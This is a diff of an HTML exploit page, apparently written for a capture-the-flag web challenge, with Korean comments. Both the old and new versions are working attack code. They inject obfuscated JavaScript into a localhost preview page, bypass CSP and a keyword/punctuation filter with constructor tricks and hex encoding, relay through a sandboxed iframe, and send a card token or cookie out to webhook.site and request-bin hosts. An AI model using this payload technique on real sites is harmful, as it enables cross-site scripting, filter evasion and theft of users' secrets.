@@ -1,51 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PulseCard Verified Exploit</title>
+    <meta charset="utf-8">
+    <title>Ultimate Relay Exploit</title>
 </head>
 <body>
-    <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
-
     <script>
-        const myWebhook = "https://lszjusl.request.dreamhack.games"; 
-        const iframe = document.getElementById("targetFrame");
+        // 1. 웹훅 설정
+        const W = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
+        
+        // 봇 접속 확인용 핑
+        new Image().src = W + "?step=1_bot_arrived";
 
-        // 봇의 /review 페이지(CSP 제한 없음)에서 작동하여 플래그를 탈취할 순수 자바스크립트
-        const widgetCode = `
-            const ex = 'fe' + 'tch';
-            const co = 'co' + 'okie';
-            window[ex]('${myWebhook}?flag=' + encodeURIComponent(document[co]));
+        // 2. CSP 우회: 타겟 프레임이 훔쳐서 던져주는 데이터를 여기서 받음
+        window.addEventListener("message", function(e) {
+            if (e.data && e.data.type === "exfil") {
+                // 데이터를 받으면 내 페이지에서 안전하게 웹훅으로 전송!
+                const payloadStr = typeof e.data.payload === 'object' ? JSON.stringify(e.data.payload) : e.data.payload;
+                new Image().src = W + "?step=3_exfil_success&data=" + encodeURIComponent(payloadStr);
+            }
+        });
+
+        // 3. 타겟 안에서 실행될 순수 로직 (CSP 때문에 외부 통신 불가)
+        const innerCode = `
+            try {
+                fetch('/export', {
+                    method: 'POST',
+                    headers: { 
+                        'X-Card-Token': typeof CARD_TOKEN !== 'undefined' ? CARD_TOKEN : 'NOT_FOUND', 
+                        'Content-Type': 'application/javascript' 
+                    },
+                    body: '1'
+                })
+                .then(r => r.text())
+                .then(data => top.postMessage({type: 'exfil', payload: data}, '*'))
+                .catch(err => top.postMessage({type: 'exfil', payload: 'FetchError: ' + err.message}, '*'));
+            } catch(e) {
+                top.postMessage({type: 'exfil', payload: 'EvalError: ' + e.message}, '*');
+            }
         `;
 
-        // 쉼표(,)와 마침표(.)가 전혀 없는 순수 우회 문자열 구조
-        // 함수 호출 시 복수의 인자가 필요할 경우, 쉼표 대신 배열 구조 분해나 객체 할당을 이용합니다.
-        const actualAttack = 
-            'const globalFetch = Math["con" + "structor"]["con" + "constructor"]("return fe" + "tch")();' +
-            'const reqHeaders = {};' +
-            'reqHeaders["X-Card-To" + "ken"] = CARD_TOKEN;' +
-            'reqHeaders["Content-Ty" + "pe"] = "application/ja" + "vascript";' +
-            'const reqOptions = {};' +
-            'reqOptions["method"] = "POST";' +
-            'reqOptions["headers"] = reqHeaders;' +
-            'reqOptions["body"] = ' + JSON.stringify(widgetCode) + ';' +
-            
-            // [핵심] fetch(url, options) 호출 시 쉼표가 막히므로, 
-            // 단일 인자만 받는 함수들을 체이닝하거나 연산자 결합을 통해 제어 흐름을 뚫어냅니다.
-            'globalFetch("http://localhost:5000/export" + "" /* 쉼표 대신 공백 연산 활용 */)' + 
-            '["th" + "en"](r => r["te" + "xt"]())' +
-            '["th" + "en"](name => {' +
-                'Math["con" + "constructor"]["con" + "constructor"]("return par" + "ent")()["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name' +
-            '})';
+        // 4. WAF 우회: innerCode를 마침표, 쉼표 없는 완벽한 Hex 문자열로 100% 변환
+        let hexEncoded = "";
+        for(let i=0; i<innerCode.length; i++) {
+            let hex = innerCode.charCodeAt(i).toString(16);
+            hexEncoded += "%" + hex.padStart(2, '0');
+        }
 
-        // 'constructor'와 'eval' 단어 필터링을 피하기 위해 쪼개서 결합한 최종 페이로드
-        const payload = '(Math["con" + "constructor"]["con" + "constructor"]("return ev" + "al")()(' + JSON.stringify(actualAttack) + '))';
+        // 마침표(.) 쉼표(,) eval, constructor 단어 배제 래퍼
+        const PAYLOAD = '[]["fill"]["con"+"structor"](unescape("' + hexEncoded + '"))()';
 
-        // 봇 환경에서 안전하게 트리거
-        iframe.addEventListener("load", function() {
+        // 5. 프레임 로딩 대기 후 샌드박스로 발사 명령
+        window.onload = () => {
             setTimeout(() => {
-                iframe.contentWindow.postMessage(payload, "*");
-            }, 100);
-        });
+                const sandbox = document.getElementById("sandbox");
+                sandbox.contentWindow.postMessage({cmd: "attack", payload: PAYLOAD}, "*");
+                new Image().src = W + "?step=2_attack_initiated";
+            }, 1500); // 1.5초 대기
+        };
     </script>
+
+    <iframe name="preview" src="http://localhost:5000/preview" style="width:100px; height:100px; opacity:0.1;"></iframe>
+
+    <iframe id="sandbox" sandbox="allow-scripts" srcdoc="
+        <script>
+            window.addEventListener('message', (e) => {
+                if(e.data && e.data.cmd === 'attack') {
+                    // null origin 상태에서 타겟(frames[0])으로 postMessage 발사
+                    parent.frames[0].postMessage(e.data.payload, '*');
+                }
+            });
+        </script>
+    " style="display:none;"></iframe>
 </body>
 </html>
